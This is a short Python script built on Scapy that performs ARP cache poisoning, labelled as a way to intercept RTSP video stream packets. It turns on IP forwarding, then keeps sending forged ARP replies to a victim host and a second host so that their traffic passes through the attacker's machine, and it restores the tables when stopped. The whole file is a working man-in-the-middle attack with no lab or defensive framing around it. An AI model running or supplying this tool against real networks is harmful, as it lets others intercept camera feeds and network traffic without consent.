# Scapy ARP poisoning to intercept RTSP packets

from scapy.all import ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, send
import time
import sys
import os


def poison(target_ip, target_mac, source_ip):
    packet = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
    send(packet, verbose=False)


def heal(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac,
                 pdst=target_ip, hwdst=target_mac)
    send(packet, verbose=False)


if __name__ == "__main__":
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    if len(sys.argv) != 3:
        print("Incorrect number of arguments!")
        exit(1)

    victim_ip = sys.argv[1]
    victim_mac = getmacbyip(victim_ip)

    spoof_ip = sys.argv[2]
    spoof_mac = getmacbyip(spoof_ip)

    attacker_iface = conf.iface
    attacker_ip = get_if_addr(attacker_iface)
    attacker_mac = get_if_hwaddr(attacker_iface)

    try:
        while True:
            print("Poisoning ARP table...")
            poison(spoof_ip, spoof_mac, victim_ip)
            poison(victim_ip, victim_mac, spoof_ip)
            time.sleep(2)
    except:
        print("Healing ARP table...")
        heal(victim_ip, victim_mac, spoof_ip, spoof_mac)
        heal(spoof_ip, spoof_mac, victim_ip, victim_mac)
